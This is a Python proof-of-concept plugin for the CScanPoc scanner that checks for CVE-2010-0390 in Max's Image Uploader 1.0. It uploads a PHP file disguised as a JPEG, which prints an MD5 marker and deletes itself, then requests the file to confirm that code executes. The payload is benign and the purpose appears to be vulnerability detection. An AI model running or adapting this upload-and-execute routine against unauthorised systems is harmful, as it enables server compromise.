# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'PHP_0002'  # 平台漏洞编号
    name = 'Maxs Image Uploader Shell Upload Vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2010-01-26'  # 漏洞公布时间
    desc = '''
        PHP F1 Max's Image Uploader 1.0版本的maxImageUpload/index.php中存在无限制文件上传漏洞。
        当Apache未被设置来处理具有pjpeg或jpeg扩展名的拟态文件时，远程攻击者可以通过上传具有一个pjpeg或jpeg扩展名的文件，执行任意代码，并借助对original/的一个直接请求来访问该文件。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2010-5310'
    cnvd_id = 'CNVD-2010-5310'  # cnvd漏洞编号
    cve_id = 'CVE-2010-0390'  # cve编号
    product = 'PHP'  # 漏洞组件名称
    product_version = 'PHP F1 Max\'s Image Uploader 1.0版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '20c72e77-764b-465d-939e-249706603996'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            testurl = urllib.parse.urljoin(
                arg, '/maxImageUpload/original/1.php')
            vulurl = urllib.parse.urljoin(arg, '/maxImageUpload/index.php')

            payload = {'myfile': (
                '1.php', '<?php echo md5(0x2333333);unlink(__FILE__);?>', 'image/jpeg')}
            data = {'submitBtn': 'Upload'}

            requests.post(vulurl, files=payload, data=data).text
            resp = requests.get(testurl)
            if '5a8adb32edd60e0cfb459cfb38093755' in resp:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
